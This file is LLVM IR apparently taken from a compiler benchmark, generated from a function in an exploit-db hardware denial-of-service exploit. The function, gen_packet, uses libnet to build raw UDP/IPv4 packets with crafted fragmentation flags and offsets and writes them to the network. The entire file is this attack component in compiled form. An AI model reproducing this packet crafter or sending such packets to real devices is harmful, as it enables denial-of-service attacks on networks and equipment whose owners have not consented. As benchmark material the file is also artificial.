; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_1496.c_gen_packet.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_1496.c_gen_packet.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LIBNET_ERRBUF_SIZE = common dso_local global i32 0, align 4
@DEVICE = common dso_local global i8* null, align 8
@LIBNET_RAW4 = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [26 x i8] c"libnet_init() failed: %s\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@LIBNET_RESOLVE = common dso_local global i32 0, align 4
@SRC_IP = common dso_local global i8* null, align 8
@DST_IP = common dso_local global i8* null, align 8
@SRC_PRT = common dso_local global i32 0, align 4
@DST_PRT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] zeroinitializer, align 1
@LIBNET_UDP_H = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [28 x i8] c"Can't build UDP header: %s\0A\00", align 1
@IP_MF = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [27 x i8] c"Can't build IP header: %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"Write error: %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"Wrote UDP packet; check the wire.\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @gen_packet(i8* %0, i8* %1, i8* %2, i32 %3, i32 %4, i32 %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i64, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  store i32* null, i32** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %26 = load i32, i32* @LIBNET_ERRBUF_SIZE, align 4
  %27 = zext i32 %26 to i64
  %28 = call i8* @llvm.stacksave()
  store i8* %28, i8** %16, align 8
  %29 = alloca i8, i64 %27, align 16
  store i64 %27, i64* %17, align 8
  store i8* null, i8** %18, align 8
  store i32 0, i32* %19, align 4
  %30 = load i8*, i8** %7, align 8
  %31 = icmp ne i8* %30, null
  br i1 %31, label %34, label %32

32:                                               ; preds = %6
  %33 = load i8*, i8** @DEVICE, align 8
  store i8* %33, i8** %7, align 8
  br label %34

34:                                               ; preds = %32, %6
  %35 = load i32, i32* @LIBNET_RAW4, align 4
  %36 = load i8*, i8** %7, align 8
  %37 = call i32* @libnet_init(i32 %35, i8* %36, i8* %29)
  store i32* %37, i32** %13, align 8
  %38 = load i32*, i32** %13, align 8
  %39 = icmp ne i32* %38, null
  br i1 %39, label %45, label %40

40:                                               ; preds = %34
  %41 = load i32, i32* @stderr, align 4
  %42 = call i32 @fprintf(i32 %41, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0), i8* %29)
  %43 = load i32, i32* @EXIT_FAILURE, align 4
  %44 = call i32 @exit(i32 %43) #4
  unreachable

45:                                               ; preds = %34
  %46 = load i8*, i8** %8, align 8
  %47 = icmp ne i8* %46, null
  br i1 %47, label %48, label %53

48:                                               ; preds = %45
  %49 = load i32*, i32** %13, align 8
  %50 = load i8*, i8** %8, align 8
  %51 = load i32, i32* @LIBNET_RESOLVE, align 4
  %52 = call i32 @libnet_name2addr4(i32* %49, i8* %50, i32 %51)
  br label %58

53:                                               ; preds = %45
  %54 = load i32*, i32** %13, align 8
  %55 = load i8*, i8** @SRC_IP, align 8
  %56 = load i32, i32* @LIBNET_RESOLVE, align 4
  %57 = call i32 @libnet_name2addr4(i32* %54, i8* %55, i32 %56)
  br label %58

58:                                               ; preds = %53, %48
  %59 = phi i32 [ %52, %48 ], [ %57, %53 ]
  store i32 %59, i32* %22, align 4
  %60 = load i8*, i8** %9, align 8
  %61 = icmp ne i8* %60, null
  br i1 %61, label %62, label %67

62:                                               ; preds = %58
  %63 = load i32*, i32** %13, align 8
  %64 = load i8*, i8** %9, align 8
  %65 = load i32, i32* @LIBNET_RESOLVE, align 4
  %66 = call i32 @libnet_name2addr4(i32* %63, i8* %64, i32 %65)
  br label %72

67:                                               ; preds = %58
  %68 = load i32*, i32** %13, align 8
  %69 = load i8*, i8** @DST_IP, align 8
  %70 = load i32, i32* @LIBNET_RESOLVE, align 4
  %71 = call i32 @libnet_name2addr4(i32* %68, i8* %69, i32 %70)
  br label %72

72:                                               ; preds = %67, %62
  %73 = phi i32 [ %66, %62 ], [ %71, %67 ]
  store i32 %73, i32* %23, align 4
  %74 = load i32, i32* %10, align 4
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %76, label %78

76:                                               ; preds = %72
  %77 = load i32, i32* %10, align 4
  br label %80

78:                                               ; preds = %72
  %79 = load i32, i32* @SRC_PRT, align 4
  br label %80

80:                                               ; preds = %78, %76
  %81 = phi i32 [ %77, %76 ], [ %79, %78 ]
  store i32 %81, i32* %20, align 4
  %82 = load i32, i32* %11, align 4
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %86

84:                                               ; preds = %80
  %85 = load i32, i32* %11, align 4
  br label %88

86:                                               ; preds = %80
  %87 = load i32, i32* @DST_PRT, align 4
  br label %88

88:                                               ; preds = %86, %84
  %89 = phi i32 [ %85, %84 ], [ %87, %86 ]
  store i32 %89, i32* %21, align 4
  %90 = load i32, i32* %12, align 4
  %91 = icmp eq i32 %90, 1
  br i1 %91, label %92, label %93

92:                                               ; preds = %88
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0), i8** %18, align 8
  store i32 8, i32* %19, align 4
  br label %93

93:                                               ; preds = %92, %88
  %94 = load i32, i32* %20, align 4
  %95 = load i32, i32* %21, align 4
  %96 = load i32, i32* @LIBNET_UDP_H, align 4
  %97 = load i32, i32* %19, align 4
  %98 = add nsw i32 %96, %97
  %99 = mul nsw i32 %98, 2
  %100 = load i8*, i8** %18, align 8
  %101 = load i32, i32* %19, align 4
  %102 = load i32*, i32** %13, align 8
  %103 = load i32, i32* %14, align 4
  %104 = call i32 @libnet_build_udp(i32 %94, i32 %95, i32 %99, i32 0, i8* %100, i32 %101, i32* %102, i32 %103)
  store i32 %104, i32* %14, align 4
  %105 = load i32, i32* %14, align 4
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %107, label %114

107:                                              ; preds = %93
  %108 = load i32, i32* @stderr, align 4
  %109 = load i32*, i32** %13, align 8
  %110 = call i8* @libnet_geterror(i32* %109)
  %111 = call i32 @fprintf(i32 %108, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0), i8* %110)
  %112 = load i32, i32* @EXIT_FAILURE, align 4
  %113 = call i32 @exit(i32 %112) #4
  unreachable

114:                                              ; preds = %93
  %115 = load i32, i32* %12, align 4
  switch i32 %115, label %120 [
    i32 1, label %116
    i32 2, label %118
    i32 3, label %119
  ]

116:                                              ; preds = %114
  %117 = load i32, i32* @IP_MF, align 4
  store i32 %117, i32* %25, align 4
  br label %120

118:                                              ; preds = %114
  store i32 8194, i32* %25, align 4
  br label %120

119:                                              ; preds = %114
  store i32 3, i32* %25, align 4
  br label %120

120:                                              ; preds = %114, %119, %118, %116
  %121 = load i32, i32* %25, align 4
  %122 = load i32, i32* @IPPROTO_UDP, align 4
  %123 = load i32, i32* %22, align 4
  %124 = load i32, i32* %23, align 4
  %125 = load i32*, i32** %13, align 8
  %126 = load i32, i32* %15, align 4
  %127 = call i32 @libnet_build_ipv4(i32 20, i32 0, i32 1800, i32 %121, i32 128, i32 %122, i32 0, i32 %123, i32 %124, i32* null, i32 0, i32* %125, i32 %126)
  store i32 %127, i32* %15, align 4
  %128 = load i32, i32* %15, align 4
  %129 = icmp eq i32 %128, -1
  br i1 %129, label %130, label %137

130:                                              ; preds = %120
  %131 = load i32, i32* @stderr, align 4
  %132 = load i32*, i32** %13, align 8
  %133 = call i8* @libnet_geterror(i32* %132)
  %134 = call i32 @fprintf(i32 %131, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0), i8* %133)
  %135 = load i32, i32* @EXIT_FAILURE, align 4
  %136 = call i32 @exit(i32 %135) #4
  unreachable

137:                                              ; preds = %120
  %138 = load i32*, i32** %13, align 8
  %139 = call i32 @libnet_write(i32* %138)
  store i32 %139, i32* %24, align 4
  %140 = load i32, i32* %24, align 4
  %141 = icmp eq i32 %140, -1
  br i1 %141, label %142, label %149

142:                                              ; preds = %137
  %143 = load i32, i32* @stderr, align 4
  %144 = load i32*, i32** %13, align 8
  %145 = call i8* @libnet_geterror(i32* %144)
  %146 = call i32 @fprintf(i32 %143, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0), i8* %145)
  %147 = load i32, i32* @EXIT_FAILURE, align 4
  %148 = call i32 @exit(i32 %147) #4
  unreachable

149:                                              ; preds = %137
  %150 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  %151 = load i32*, i32** %13, align 8
  %152 = call i32 @libnet_destroy(i32* %151)
  %153 = load i32, i32* @EXIT_SUCCESS, align 4
  %154 = load i8*, i8** %16, align 8
  call void @llvm.stackrestore(i8* %154)
  ret i32 %153
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32* @libnet_init(i32, i8*, i8*) #2

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @libnet_name2addr4(i32*, i8*, i32) #2

declare dso_local i32 @libnet_build_udp(i32, i32, i32, i32, i8*, i32, i32*, i32) #2

declare dso_local i8* @libnet_geterror(i32*) #2

declare dso_local i32 @libnet_build_ipv4(i32, i32, i32, i32, i32, i32, i32, i32, i32, i32*, i32, i32*, i32) #2

declare dso_local i32 @libnet_write(i32*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @libnet_destroy(i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
